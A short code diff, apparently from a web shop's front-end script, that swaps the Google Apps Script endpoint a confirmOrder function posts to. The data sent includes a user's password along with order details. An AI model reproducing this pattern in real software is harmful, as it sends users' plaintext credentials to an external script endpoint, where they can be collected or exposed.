@@ -115,7 +115,7 @@ function confirmOrder() {
         password: password
     };
 
-    fetch('https://script.google.com/macros/s/AKfycbxn25Htflu4L7IP7jJtKzvbwozTfRcVDPixhLFqMca7oUsauNXnmXo6dKAUQZiGG9GQ4A/exec', {
+    fetch('https://script.google.com/macros/s/AKfycbz6ggriH0SRiOWVBHAm1eyIrfr8ONqtOBZN9XkRqzAvzibYRnfSVGCRxYeuVNeflqbxUg/exec', {
         method: 'POST',
         contentType: 'application/json',
         body: JSON.stringify(data)
